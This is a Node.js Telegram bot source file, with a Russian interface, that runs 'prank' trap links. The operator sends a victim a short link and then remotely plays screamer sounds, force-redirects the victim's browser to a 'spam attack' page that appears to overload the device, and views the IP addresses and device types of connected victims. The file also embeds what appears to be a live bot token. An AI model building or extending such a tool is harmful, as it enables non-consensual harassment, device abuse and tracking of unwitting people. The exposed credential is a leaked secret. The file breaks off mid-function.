const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

// --- ПОДКЛЮЧЕНИЕ FFMPEG ---
const ffmpeg = require('fluent-ffmpeg');
const ffmpegPath = require('@ffmpeg-installer/ffmpeg').path;
ffmpeg.setFfmpegPath(ffmpegPath);

// --- НАСТРОЙКИ ---
const token = '8249796254:AAGV3kYCPf-siSmvl4SOXU4_44HS0y5RUPM';
const DOMAIN = 'https://prank-nfc-md0m.onrender.com';
const SUPPORT_USERNAME = '@ivasites'; // Замените на ваш username поддержки

// Проверка глобальных переменных
if (!global.sessions || !global.activeVictims || !global.shortLinks) {
    console.error('❌ ОШИБКА: Глобальные переменные не инициализированы!');
    process.exit(1);
}

const bot = new TelegramBot(token, { 
    polling: {
        interval: 300,
        autoStart: true,
        params: { timeout: 10 }
    }
});

const UPLOAD_DIR = path.join(__dirname, 'public', 'uploads');
const wizardState = {};
const userMessages = {}; // Храним ID сообщений для удаления

console.log('🚀 NFC Bot Premium запускается...');

// --- ГЕНЕРАТОР КОДА ---
function generateShortCode() {
    const chars = 'abcdefhkmnpqrstuvwxyz23456789';
    let result = '';
    for (let i = 0; i < 5; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
    if (global.shortLinks && global.shortLinks[result]) return generateShortCode();
    return result;
}

// --- УДАЛЕНИЕ СТАРЫХ СООБЩЕНИЙ ---
async function deleteOldMessages(chatId) {
    if (userMessages[chatId] && userMessages[chatId].length > 0) {
        for (const msgId of userMessages[chatId]) {
            try {
                await bot.deleteMessage(chatId, msgId);
            } catch (e) {
                // Игнорируем ошибки удаления
            }
        }
        userMessages[chatId] = [];
    }
}

// --- СОХРАНЕНИЕ ID СООБЩЕНИЯ ---
function saveMessageId(chatId, messageId) {
    if (!userMessages[chatId]) {
        userMessages[chatId] = [];
    }
    userMessages[chatId].push(messageId);
}

// --- ЗАГРУЗКА ФАЙЛОВ ---
async function downloadFile(fileId, type) {
    try {
        const link = await bot.getFileLink(fileId);
        const ext = path.extname(link);
        const name = `${type}_${Date.now()}_${uuidv4().slice(0,4)}${ext}`;
        const filePath = path.join(UPLOAD_DIR, name);
        
        const writer = fs.createWriteStream(filePath);
        const res = await axios({ url: link, method: 'GET', responseType: 'stream' });
        res.data.pipe(writer);

        return new Promise((resolve, reject) => {
            writer.on('finish', () => resolve({ url: `/uploads/${name}`, path: filePath }));
            writer.on('error', reject);
        });
    } catch (e) {
        console.error('Ошибка загрузки:', e);
        return { url: null, path: null };
    }
}

// --- FFMPEG ЛОГИКА ---
async function extractAudioFromVideo(videoPath) {
    return new Promise((resolve, reject) => {
        const audioPath = videoPath.replace(/\.(mp4|mov|avi|mkv)$/i, '.mp3');
        
        const timeout = setTimeout(() => {
            reject(new Error('Video processing timeout'));
        }, 30000); // 30 секунд максимум
        
        ffmpeg(videoPath)
            .toFormat('mp3')
            .audioCodec('libmp3lame')
            .audioBitrate('96k') // Знижено з 192k для швидкості
            .audioChannels(1) // Моно замість стерео
            .audioFrequency(22050) // Знижена частота
            .on('end', () => {
                clearTimeout(timeout);
                const audioUrl = audioPath.replace(UPLOAD_DIR, '/uploads').replace(/\\/g, '/');
                resolve({ url: audioUrl, path: audioPath });
            })
            .on('error', (err) => {
                clearTimeout(timeout);
                reject(err);
            })
            .save(audioPath);
    });
}

async function convertStickerToImage(stickerPath) {
    return new Promise((resolve, reject) => {
        const imagePath = stickerPath.replace(/\.webp$/i, '.jpg');
        
        const timeout = setTimeout(() => {
            reject(new Error('Sticker processing timeout'));
        }, 20000); // 20 секунд максимум
        
        ffmpeg(stickerPath)
            .outputOptions([
                '-vf', 'scale=512:512:force_original_aspect_ratio=decrease,pad=512:512:(ow-iw)/2:(oh-ih)/2:black', // Знижено з 800x800
                '-q:v', '5' // Якість JPEG (2-31, менше = краще)
            ])
            .toFormat('mjpeg')
            .on('end', () => {
                clearTimeout(timeout);
                const imageUrl = imagePath.replace(UPLOAD_DIR, '/uploads').replace(/\\/g, '/');
                fs.unlink(stickerPath, () => {});
                resolve({ url: imageUrl, path: imagePath });
            })
            .on('error', (err) => {
                clearTimeout(timeout);
                reject(err);
            })
            .save(imagePath);
    });
}

// --- ГЛАВНОЕ МЕНЮ ---
function getMainMenu() {
    return {
        inline_keyboard: [
            [
                { text: '🎯 Создать ловушку', callback_data: 'create_new' },
                { text: '📂 Мои сессии', callback_data: 'my_sessions' }
            ],
            [
                { text: '📊 Статистика', callback_data: 'stats' },
                { text: '📖 Инструкция', callback_data: 'guide' }
            ],
            [
                { text: '💬 Тех. поддержка', url: `https://t.me/${SUPPORT_USERNAME.replace('@', '')}` }
            ]
        ]
    };
}

bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const userName = msg.from.first_name || 'Пользователь';
    
    await deleteOldMessages(chatId);
    
    const welcomeText = `
🎭 <b>NFC Control Premium</b>

Привет, ${userName}! 👋

Добро пожаловать в систему управления пранками нового поколения.

<b>Возможности:</b>
• 🎯 Создание ловушек с кастомным контентом
• 🔊 Скримеры с любым звуком
• 🖼 Фоновые изображения и стикеры
• ☢️ Спам-атаки на устройства
• 📊 Детальная статистика переходов

Выбери действие в меню ниже 👇`;

    const sentMsg = await bot.sendMessage(chatId, welcomeText, {
        parse_mode: 'HTML',
        reply_markup: getMainMenu()
    });
    saveMessageId(chatId, sentMsg.message_id);
});

// --- ОБРАБОТКА CALLBACK КНОПОК ---
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const data = query.data;

    // Главное меню
    if (data === 'main_menu') {
        await deleteOldMessages(chatId);
        
        const text = `
🎭 <b>NFC Control Premium</b>

Главное меню системы управления пранками.
Выбери нужное действие 👇`;

        const sentMsg = await bot.sendMessage(chatId, text, {
            parse_mode: 'HTML',
            reply_markup: getMainMenu()
        });
        saveMessageId(chatId, sentMsg.message_id);
        
        bot.answerCallbackQuery(query.id);
        return;
    }

    // Создать новую ловушку
    if (data === 'create_new') {
        wizardState[chatId] = { step: 1, data: {} };
        
        await deleteOldMessages(chatId);
        
        const text = `
<b>🎯 Создание новой ловушки</b>

<b>Шаг 1 из 2: Фоновое изображение</b>

Отправь мне:
• 🖼 Фото
• 🎨 Стикер
• 🎬 Видео (извлечется аудио)

Или напиши <code>skip</code> чтобы пропустить этот шаг.`;

        const sentMsg = await bot.sendMessage(chatId, text, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Отменить', callback_data: 'main_menu' }]
                ]
            }
        });
        saveMessageId(chatId, sentMsg.message_id);
        
        bot.answerCallbackQuery(query.id, { text: '🎯 Начинаем создание...' });
        return;
    }

    // Мои сессии
    if (data === 'my_sessions') {
        if (!global.sessions) {
            bot.answerCallbackQuery(query.id, { text: '⚠️ Ошибка данных' });
            return;
        }
        
        const sessions = Object.values(global.sessions);
        if (sessions.length === 0) {
            await deleteOldMessages(chatId);
            
            const sentMsg = await bot.sendMessage(chatId, '📂 <b>Мои сессии</b>\n\nУ вас пока нет активных сессий.\nСоздайте первую ловушку! 🎯', {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🎯 Создать ловушку', callback_data: 'create_new' }],
                        [{ text: '🔙 Назад', callback_data: 'main_menu' }]
                    ]
                }
            });
            saveMessageId(chatId, sentMsg.message_id);
            
            bot.answerCallbackQuery(query.id);
            return;
        }

        const recentSessions = sessions.slice(-5).reverse();
        
        await deleteOldMessages(chatId);
        
        const headerMsg = await bot.sendMessage(chatId, `📂 <b>Ваши последние ${recentSessions.length} сессий:</b>`, { parse_mode: 'HTML' });
        saveMessageId(chatId, headerMsg.message_id);
        
        for (const s of recentSessions) {
            await new Promise(resolve => setTimeout(resolve, 300));
            sendControlPanel(chatId, s.id);
        }
        
        bot.answerCallbackQuery(query.id, { text: '📂 Список сессий' });
        return;
    }

    // Статистика
    if (data === 'stats') {
        const vCount = Object.keys(global.activeVictims || {}).length;
        const sCount = Object.keys(global.sessions || {}).length;
        
        let totalVictims = 0;
        Object.values(global.sessions || {}).forEach(s => {
            totalVictims += s.totalVictims || 0;
        });

        await deleteOldMessages(chatId);

        const statsText = `
📊 <b>Общая статистика</b>

🎯 <b>Активные сессии:</b> ${sCount}
👥 <b>Жертв онлайн:</b> ${vCount}
👁 <b>Всего переходов:</b> ${totalVictims}

🌐 <b>Домен:</b> <code>${DOMAIN}</code>

📅 <b>Обновлено:</b> ${new Date().toLocaleString('ru-RU')}`;

        const sentMsg = await bot.sendMessage(chatId, statsText, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🔄 Обновить', callback_data: 'stats' }],
                    [{ text: '🔙 Назад', callback_data: 'main_menu' }]
                ]
            }
        });
        saveMessageId(chatId, sentMsg.message_id);
        
        bot.answerCallbackQuery(query.id, { text: '📊 Статистика обновлена' });
        return;
    }

    // Инструкция
    if (data === 'guide') {
        await deleteOldMessages(chatId);
        
        const guideText = `
📖 <b>Инструкция по использованию</b>

<b>Как создать ловушку:</b>

1️⃣ Нажми "Создать ловушку"
2️⃣ Отправь фоновое изображение (или skip)
3️⃣ Отправь звук для скримера (или skip)
4️⃣ Получи готовую ссылку

<b>Управление:</b>
🔊 <b>Скример</b> - воспроизвести звук
☢️ <b>Спам</b> - редирект на атаку
🖼 <b>Изменить фон</b> - заменить изображение
🔊 <b>Изменить звук</b> - заменить аудио
❌ <b>Удалить</b> - удалить сессию

<b>Форматы файлов:</b>
• Изображения: JPG, PNG
• Стикеры: WEBP (автоконвертация)
• Звук: MP3, OGG, M4A, голосовые
• Видео: MP4, MOV (извлечётся аудио)

<b>💡 Совет:</b> Используйте короткие звуки (до 10 сек) для лучшего эффекта скримера.`;

        const sentMsg = await bot.sendMessage(chatId, guideText, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🔙 Назад', callback_data: 'main_menu' }]
                ]
            }
        });
        saveMessageId(chatId, sentMsg.message_id);
        
        bot.answerCallbackQuery(query.id, { text: '📖 Инструкция' });
        return;
    }

    // Управление сессиями
    if (data.includes('_')) {
        const parts = data.split('_');
        const action = parts[0];
        let sessionId = parts.slice(1).join('_'); // На случай если в ID есть _
        
        // Для кнопок редактирования парсим по-особому
        if (action === 'edit') {
            const editType = parts[1]; // image или sound
            sessionId = parts.slice(2).join('_');
        }
        
        // Для удаления не проверяем существование сессии
        if (action === 'confirm') {
            const actualAction = parts[1]; // confirm_del_sessionId
            const actualSessionId = parts.slice(2).join('_');
            
            if (actualAction === 'del') {
                const s = global.sessions[actualSessionId];
                
                if (s && global.shortLinks[s.shortCode]) {
                    delete global.shortLinks[s.shortCode];
                }
                if (global.sessions[actualSessionId]) {
                    delete global.sessions[actualSessionId];
                }
                
                await deleteOldMessages(chatId);
                
                const sentMsg = await bot.sendMessage(chatId, '✅ Сессия успешно удалена', {
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '🔙 В главное меню', callback_data: 'main_menu' }]
                        ]
                    }
                });
                saveMessageId(chatId, sentMsg.message_id);
                
                bot.answerCallbackQuery(query.id, { text: '✅ Удалено' });
                return;
            }
        }
        
        const s = global.sessions ? global.sessions[sessionId] : null;

        if (!s && action !== 'del' && action !== 'edit') {
            bot.answerCallbackQuery(query.id, { text: '⚠️ Сессия не найдена' });
            return;
        }
        
        if (!global.io) {
            bot.answerCallbackQuery(query.id, { text: '⚠️ Ошибка сервера' });
            return;
        }

        switch (action) {
            case 'scare':
                global.io.to(sessionId).emit('play-sound');
                bot.answerCallbackQuery(query.id, { text: '🔊 Скример активирован!', show_alert: true });
                break;

            case 'bomb':
                global.io.to(sessionId).emit('force-redirect', { url: `${DOMAIN}/volumeshader_bm.html` });
                bot.answerCallbackQuery(query.id, { text: '☢️ Спам-атака запущена!', show_alert: true });
                break;

            case 'auto':
                // Додаткова перевірка існування сесії
                if (!s) {
                    bot.answerCallbackQuery(query.id, { text: '⚠️ Сессия не найдена' });
                    return;
                }
                
                s.autoMode = !s.autoMode;
                global.io.to(sessionId).emit('update-media', { sound: s.sound, image: s.image, auto: s.autoMode });
                
                // Обновляем панель
                await deleteOldMessages(chatId);
                sendControlPanel(chatId, sessionId);
                
                bot.answerCallbackQuery(query.id, { text: `🤖 Авто: ${s.autoMode ? 'ON' : 'OFF'}` });
                break;

            case 'refresh':
                await deleteOldMessages(chatId);
                sendControlPanel(chatId, sessionId);
                bot.answerCallbackQuery(query.id, { text: '🔄 Обновлено' });
                break;

            case 'del':
                await deleteOldMessages(chatId);
                
                // Перевіряємо чи існує сесія
                if (!s) {
                    bot.answerCallbackQuery(query.id, { text: '⚠️ Сессия не найдена' });
                    return;
                }
                
                const confirmText = `
⚠️ <b>Подтверждение удаления</b>

Вы уверены, что хотите удалить эту сессию?

Код: <code>${s.shortCode}</code>
Переходов: ${s.totalVictims}

<b>Это действие необратимо!</b>`;

                const sentMsg = await bot.sendMessage(chatId, confirmText, {
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '✅ Да, удалить', callback_data: `confirm_del_${sessionId}` },
                                { text: '❌ Отмена', callback_data: `refresh_${sessionId}` }
                            ]
                        ]
                    }
                });
                saveMessageId(chatId, sentMsg.message_id);
                
                bot.answerCallbackQuery(query.id);
                break;

            case 'info':
                // Додаткова перевірка існування сесії
                if (!s) {
                    bot.answerCallbackQuery(query.id, { text: '⚠️ Сессия не найдена' });
                    return;
                }
                
                const infoText = `
ℹ️ <b>Информация о сессии</b>

🆔 <b>ID:</b> <code>${s.id}</code>
🔗 <b>Короткий код:</b> <code>${s.shortCode}</code>
📅 <b>Создана:</b> ${s.createdAt.toLocaleString('ru-RU')}

<b>Настройки:</b>
• Фон: ${s.image ? '✅ Установлен' : '❌ Не установлен'}
• Звук: ${s.sound ? '✅ Установлен' : '❌ Не установлен'}
• Авто-режим: ${s.autoMode ? '🟢 Включен' : '🔴 Выключен'}

<b>Статистика:</b>
• Всего переходов: ${s.totalVictims}
• Последняя активность: ${new Date(s.lastActiveAt).toLocaleString('ru-RU')}`;

                bot.answerCallbackQuery(query.id, { text: 'ℹ️ Подробная информация', show_alert: false });
                
                const infoMsg = await bot.sendMessage(chatId, infoText, {
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '🔙 К панели', callback_data: `refresh_${sessionId}` }]
                        ]
                    }
                });
                saveMessageId(chatId, infoMsg.message_id);
                break;

            case 'edit':
                const editType = parts[1]; // image или sound
                const editSessionId = parts.slice(2).join('_');
                
                // Проверяем существование сессии
                if (!global.sessions[editSessionId]) {
                    bot.answerCallbackQuery(query.id, { text: '⚠️ Сессия не найдена' });
                    return;
                }
                
                wizardState[chatId] = { 
                    step: editType === 'image' ? 'edit_image' : 'edit_sound', 
                    sessionId: editSessionId 
                };
                
                await deleteOldMessages(chatId);
                
                const editText = editType === 'image' 
                    ? '<b>🖼 Изменение фона</b>\n\nОтправь новое фото, стикер или видео.\nНапиши <code>skip</code> для отмены.'
                    : '<b>🔊 Изменение звука</b>\n\nОтправь новый аудиофайл, голосовое или видео.\nНапиши <code>skip</code> для отмены.';
                
                const editMsg = await bot.sendMessage(chatId, editText, {
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '❌ Отменить', callback_data: `refresh_${editSessionId}` }]
                        ]
                    }
                });
                saveMessageId(chatId, editMsg.message_id);
                
                bot.answerCallbackQuery(query.id, { text: editType === 'image' ? '🖼 Ожидаю новый фон...' : '🔊 Ожидаю новый звук...' });
                break;
        }
    }
});

// --- ОБРАБОТКА СООБЩЕНИЙ ---
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    // Игнорируем команды
    if (text && text.startsWith('/')) return;

    // --- WIZARD ---
    if (wizardState[chatId]) {
        const st = wizardState[chatId];

        // РЕДАКТИРОВАНИЕ ИЗОБРАЖЕНИЯ
        if (st.step === 'edit_image') {
            if (text && text.toLowerCase() === 'skip') {
                delete wizardState[chatId];
                await deleteOldMessages(chatId);
                sendControlPanel(chatId, st.sessionId);
                return;
            }

            const loadingMsg = await bot.sendMessage(chatId, '⏳ <b>Обработка...</b>\n\n▓░░░░░░░░░ 10%', { parse_mode: 'HTML' });
            
            try {
                let newImage = '';
                
                if (msg.photo) {
                    const f = await downloadFile(msg.photo[msg.photo.length - 1].file_id, 'img');
                    newImage = f.url || '';
                } 
                else if (msg.sticker) {
                    await bot.editMessageText('⏳ <b>Обработка...</b>\n\n▓▓▓░░░░░░░ 30%', {
                        chat_id: chatId,
                        message_id: loadingMsg.message_id,
                        parse_mode: 'HTML'
                    }).catch(() => {});
                    
                    const f = await downloadFile(msg.sticker.file_id, 'sticker');
                    
                    await bot.editMessageText('⏳ <b>Обработка...</b>\n\n▓▓▓▓▓▓░░░░ 60%', {
                        chat_id: chatId,
                        message_id: loadingMsg.message_id,
                        parse_mode: 'HTML'
                    }).catch(() => {});
                    
                    if (f.path) {
                        const converted = await convertStickerToImage(f.path);
                        newImage = converted.url || '';
                    }
                }
                else {
                    bot.deleteMessage(chatId, loadingMsg.message_id).catch(()=>{});
                    bot.sendMessage(chatId, '⚠️ <b>Неверный формат</b>\n\nОтправь фото или стикер', {
                        parse_mode: 'HTML'
                    });
                    return;
                }

                // Обновляем сессию
                if (global.sessions[st.sessionId]) {
                    console.log('🖼 Updating image for session:', st.sessionId);
                    console.log('  - Old image:', global.sessions[st.sessionId].image);
                    console.log('  - New image:', newImage);
                    
                    global.sessions[st.sessionId].image = newImage;
                    
                    console.log('📡 Broadcasting updated media...');
                    global.io.to(st.sessionId).emit('update-media', { 
                        sound: global.sessions[st.sessionId].sound, 
                        image: newImage,
                        auto: global.sessions[st.sessionId].autoMode
                    });
                    console.log('✅ Image updated and broadcasted');
                } else {
                    console.log('⚠️ Session not found:', st.sessionId);
                }

                bot.deleteMessage(chatId, loadingMsg.message_id).catch(()=>{});
                
                await deleteOldMessages(chatId);
                const successMsg = await bot.sendMessage(chatId, '✅ <b>Фон успешно обновлён!</b>', { parse_mode: 'HTML' });
                saveMessageId(chatId, successMsg.message_id);
                
                delete wizardState[chatId];
                
                setTimeout(() => sendControlPanel(chatId, st.sessionId), 500);
            } catch (e) {
                console.error(e);
                bot.deleteMessage(chatId, loadingMsg.message_id).catch(()=>{});
            }
            return;
        }

        // РЕДАКТИРОВАНИЕ ЗВУКА
        if (st.step === 'edit_sound') {
            if (text && text.toLowerCase() === 'skip') {
                delete wizardState[chatId];
                await deleteOldMessages(chatId);
                sendControlPanel(chatId, st.sessionId);
                return;
            }

            const loadingMsg = await bot.sendMessage(chatId, '⏳ <b>Обработка...</b>\n\n▓░░░░░░░░░ 10%', { parse_mode: 'HTML' });
            
            try {
                let newSound = '';
                
                if (msg.audio) {
                    await bot.editMessageText('⏳ <b>Обработка...</b>\n\n▓▓▓░░░░░░░ 30%', {
                        chat_id: chatId,
                        message_id: loadingMsg.message_id,
                        parse_mode: 'HTML'
                    }).catch(() => {});
                    
                    const f = await downloadFile(msg.audio.file_id, 'snd');
                    newSound = f.url || '';
                }
                else if (msg.voice) {
                    await bot.editMessageText('⏳ <b>Обработка...</b>\n\n▓▓▓░░░░░░░ 30%', {
                        chat_id: chatId,
                        message_id: loadingMsg.message_id,
                        parse_mode: 'HTML'
                    }).catch(() => {});
                    
                    const f = await downloadFile(msg.voice.file_id, 'voice');
                    newSound = f.url || '';
                }
                else if (msg.video) {
                    await bot.editMessageText('⏳ <b>Обработка...</b>\n\n▓▓░░░░░░░░ 20%', {
                        chat_id: chatId,
                        message_id: loadingMsg.message_id,
                        parse_mode: 'HTML'
                    }).catch(() => {});
                    
                    const f = await downloadFile(msg.video.file_id, 'video');
                    
                    await bot.editMessageText('⏳ <b>Обработка...</b>\n\n▓▓▓▓░░░░░░ 40%', {
                        chat_id: chatId,
                        message_id: loadingMsg.message_id,
                        parse_mode: 'HTML'
                    }).catch(() => {});
                    
                    if (f.path) {
                        await bot.editMessageText('⏳ <b>Извлечение аудио...</b>\n\n▓▓▓▓▓▓░░░░ 60%', {
                            chat_id: chatId,
                            message_id: loadingMsg.message_id,
                            parse_mode: 'HTML'
                        }).catch(() => {});
                        
                        const audioData = await extractAudioFromVideo(f.path);
                        newSound = audioData.url || '';
                    }
                }
                else {
                    bot.deleteMessage(chatId, loadingMsg.message_id).catch(()=>{});
                    bot.sendMessage(chatId, '⚠️ <b>Неверный формат</b>\n\nОтправь аудио, голосовое или видео', {
                        parse_mode: 'HTML'
                    });
                    return;
                }

                // Обновляем сессию
                if (global.sessions[st.sessionId]) {
                    console.log('🔊 Updating sound for session:', st.sessionId);
                    console.log('  - Old sound:', global.sessions[st.sessionId].sound);
                    console.log('  - New sound:', newSound);
                    
                    global.sessions[st.sessionId].sound = newSound;
                    
                    console.log('📡 Broadcasting updated media...');
                    global.io.to(st.sessionId).emit('update-media', { 
                        sound: newSound, 
                        image: global.sessions[st.sessionId].image,
                        auto: global.sessions[st.sessionId].autoMode
                    });
                    console.log('✅ Sound updated and broadcasted');
                } else {
                    console.log('⚠️ Session not found:', st.sessionId);
                }

                bot.deleteMessage(chatId, loadingMsg.message_id).catch(()=>{});
                
                await deleteOldMessages(chatId);
                const successMsg = await bot.sendMessage(chatId, '✅ <b>Звук успешно обновлён!</b>', { parse_mode: 'HTML' });
                saveMessageId(chatId, successMsg.message_id);
                
                delete wizardState[chatId];
                
                setTimeout(() => sendControlPanel(chatId, st.sessionId), 500);
            } catch (e) {
                console.error(e);
                bot.deleteMessage(chatId, loadingMsg.message_id).catch(()=>{});
            }
            return;
        }

        // ШАГ 1: ФОН
        if (st.step === 1) {
            const loadingMsg = await bot.sendMessage(chatId, '⏳ <b>Обработка...</b>\n\n▓░░░░░░░░░ 10%', { parse_mode: 'HTML' });
            
            try {
                if (msg.photo) {
                    await bot.editMessageText('⏳ <b>Загрузка...</b>\n\n▓▓▓░░░░░░░ 30%', {
                        chat_id: chatId,
                        message_id: loadingMsg.message_id,
                        parse_mode: 'HTML'
                    }).catch(() => {});
                    
                    const f = await downloadFile(msg.photo[msg.photo.length - 1].file_id, 'img');
                    st.data.image = f.url || '';
                    st.data.sound = '';
                } 
                else if (msg.sticker) {
                    await bot.editMessageText('⏳ <b>Загрузка...</b>\n\n▓▓░░░░░░░░ 20%', {
                        chat_id: chatId,
                        message_id: loadingMsg.message_id,
                        parse_mode: 'HTML'
                    }).catch(() => {});
                    
                    const f = await downloadFile(msg.sticker.file_id, 'sticker');
                    
                    await bot.editMessageText('⏳ <b>Конвертация...</b>\n\n▓▓▓▓▓░░░░░ 50%', {
                        chat_id: chatId,
                        message_id: loadingMsg.message_id,
                        parse_mode: 'HTML'
                    }).catch(() => {});
                    
                    if (f.path) {
                        const converted = await convertStickerToImage(f.path);
                        st.data.image = converted.url || '';
                    }
                    st.data.sound = '';
                }
                else if (msg.video || msg.video_note) {
                    await bot.editMessageText('⏳ <b>Загрузка...</b>\n\n▓▓░░░░░░░░ 20%', {
                        chat_id: chatId,
                        message_id: loadingMsg.message_id,
                        parse_mode: 'HTML'
                    }).catch(() => {});
                    
                    const fileId = msg.video ? msg.video.file_id : msg.video_note.file_id;
                    const f = await downloadFile(fileId, 'video');
                    
                    await bot.editMessageText('⏳ <b>Извлечение аудио...</b>\n\n▓▓▓▓▓░░░░░ 50%', {
                        chat_id: chatId,
                        message_id: loadingMsg.message_id,
                        parse_mode: 'HTML'
                    }).catch(() => {});
                    
                    if (f.path) {
                        const audioData = await extractAudioFromVideo(f.path);
                        st.data.sound = audioData.url || '';
                    }
                    st.data.image = '';
                }
                else if (text && text.toLowerCase() === 'skip') {
                    st.data.image = '';
                    st.data.sound = '';
                }
                else {
                    bot.deleteMessage(chatId, loadingMsg.message_id).catch(()=>{});
                    const errMsg = await bot.sendMessage(chatId, '⚠️ <b>Неверный формат</b>\n\nОтправь фото, стикер, видео или напиши <code>skip</code>', { 
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '❌ Отменить', callback_data: 'main_menu' }]
                            ]
                        }
                    });
                    saveMessageId(chatId, errMsg.message_id);
                    return;
                }
            } catch (e) {
                console.error(e);
                bot.deleteMessage(chatId, loadingMsg.message_id).catch(()=>{});
                const errMsg = await bot.sendMessage(chatId, '❌ Ошибка обработки файла. Попробуй снова.', {
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '❌ Отменить', callback_data: 'main_menu' }]
                        ]
                    }
                });
                saveMessageId(chatId, errMsg.message_id);
                return;
            }

            bot.deleteMessage(chatId, loadingMsg.message_id).catch(()=>{});
            
            st.step = 2;
            
            const soundText = st.data.sound 
                ? '✅ <b>Звук уже извлечён из видео!</b>\n\nМожешь отправить другой звук или напиши <code>skip</code> для завершения.' 
                : '<b>Шаг 2 из 2: Звук для скримера</b>\n\nОтправь мне:\n• 🔊 Аудиофайл\n• 🎤 Голосовое сообщение\n• 🎬 Видео\n\nИли напиши <code>skip</code> чтобы пропустить.';
            
            const stepMsg = await bot.sendMessage(chatId, soundText, { 
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '❌ Отменить', callback_data: 'main_menu' }]
                    ]
                }
            });
            saveMessageId(chatId, stepMsg.message_id);
            return;
        }

        // ШАГ 2: ЗВУК
        if (st.step === 2) {
            if (!st.data.sound || (msg.audio || msg.voice || msg.video)) {
                const loadingMsg = await bot.sendMessage(chatId, '⏳ <b>Загрузка звука...</b>', { parse_mode: 'HTML' });
                 
                try {
                    if (msg.audio) {
                        const f = await downloadFile(msg.audio.file_id, 'snd');
                        st.data.sound = f.url || '';
                    }
                    else if (msg.voice) {
                        const f = await downloadFile(msg.voice.file_id, 'voice');
                        st.data.sound = f.url || '';
                    }
                    else if (msg.video) {
                        const f = await downloadFile(msg.video.file_id, 'video');
                        if (f.path) {
                            const audioData = await extractAudioFromVideo(f.path);
                            st.data.sound = audioData.url || '';
                        }
                    }
                    else if (text && text.toLowerCase() === 'skip') {
                        // Пропускаем
                    }
                    else {
                        bot.deleteMessage(chatId, loadingMsg.message_id).catch(()=>{});
                        const errMsg = await bot.sendMessage(chatId, '⚠️ <b>Неверный формат</b>\n\nОтправь аудио, голосовое или напиши <code>skip</code>', {
                            parse_mode: 'HTML',
                            reply_markup: {
                                inline_keyboard: [
                                    [{ text: '❌ Отменить', callback_data: 'main_menu' }]
                                ]
                            }
                        });
                        saveMessageId(chatId, errMsg.message_id);
                        return;
                    }
                } catch (e) {
                    console.error(e);
                }
                 
                bot.deleteMessage(chatId, loadingMsg.message_id).catch(()=>{});
            }

            finishSessionCreation(chatId, st.data);
            delete wizardState[chatId];
        }
    }
});

// --- СОЗДАНИЕ СЕССИИ ---
async function finishSessionCreation(chatId, data) {
    const id = uuidv4();
    const code = generateShortCode();

    console.log('🎯 Creating new session:');
    console.log('  - Session ID:', id);
    console.log('  - Short code:', code);
    console.log('  - Image:', data.image || 'none');
    console.log('  - Sound:', data.sound || 'none');

    const session = {
        id: id,
        shortCode: code,
        image: data.image || '',
        sound: data.sound || '',
        autoMode: false, // Авто-режим выключен по умолчанию
        totalVictims: 0,
        createdAt: new Date(),
        lastActiveAt: Date.now(),
        imagesFiles: [],
        soundsFiles: []
    };

    global.sessions[id] = session;
    global.shortLinks[code] = id;

    console.log('✅ Session created and saved to global.sessions');
    console.log('✅ Short link registered:', code, '→', id);
    console.log('📋 Total sessions:', Object.keys(global.sessions).length);
    console.log('📋 Total short links:', Object.keys(global.shortLinks).length);

    await deleteOldMessages(chatId);

    const successText = `
✅ <b>Ловушка успешно создана!</b>

🔗 <b>Ваша ссылка:</b>
<code>${DOMAIN}/${code}</code>

🆔 <b>Короткий код:</b> <code>${code}</code>

<b>Настройки:</b>
• Фон: ${data.image ? '✅' : '❌'}
• Звук: ${data.sound ? '✅' : '❌'}

Отправь ссылку жертве и управляй через панель! 🎮`;

    const successMsg = await bot.sendMessage(chatId, successText, { parse_mode: 'HTML' });
    saveMessageId(chatId, successMsg.message_id);
    
    setTimeout(() => sendControlPanel(chatId, id), 500);
}

// --- ПАНЕЛЬ УПРАВЛЕНИЯ ---
async function sendControlPanel(chatId, sessionId) {
    const s = global.sessions[sessionId];
    if (!s) {
        const errMsg = await bot.sendMessage(chatId, '⚠️ Сессия не найдена.', {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🔙 В главное меню', callback_data: 'main_menu' }]
                ]
            }
        });
        saveMessageId(chatId, errMsg.message_id);
        return;
    }

    const victims = Object.values(global.activeVictims || {}).filter(v => v.roomId === sessionId);
    const link = `${DOMAIN}/${s.shortCode}`;
    
    // Эмодзи статусов
    const bgStatus = s.image ? '🟢' : '🔴';
    const soundStatus = s.sound ? '🟢' : '🔴';
    const autoStatus = s.autoMode ? '🟢' : '🔴';
    
    let statusText = `
🎮 <b>Панель управления</b>

🔗 <b>Ссылка:</b> <code>${link}</code>
🆔 <b>Код:</b> <code>${s.shortCode}</code>

⚙️ <b>Настройки:</b>
${bgStatus} Фон: ${s.image ? 'Установлен' : 'Отсутствует'}
${soundStatus} Звук: ${s.sound ? 'Установлен' : 'Отсутствует'}
${autoStatus} Авто-режим: ${s.autoMode ? 'Включен' : 'Выключен'}

📊 <b>Статистика:</b>
👥 Онлайн: <b>${victims.length}</b>
👁 Переходов: <b>${s.totalVictims}</b>`;

    if (victims.length > 0) {
        statusText += `\n\n📱 <b>Подключенные устройства:</b>`;
        victims.forEach((v, i) => {
            statusText += `\n${i + 1}. ${v.device} • ${v.ip}`;
        });
    }

    const keyboard = [
        [
            { text: '🔊 Скример', callback_data: `scare_${sessionId}` },
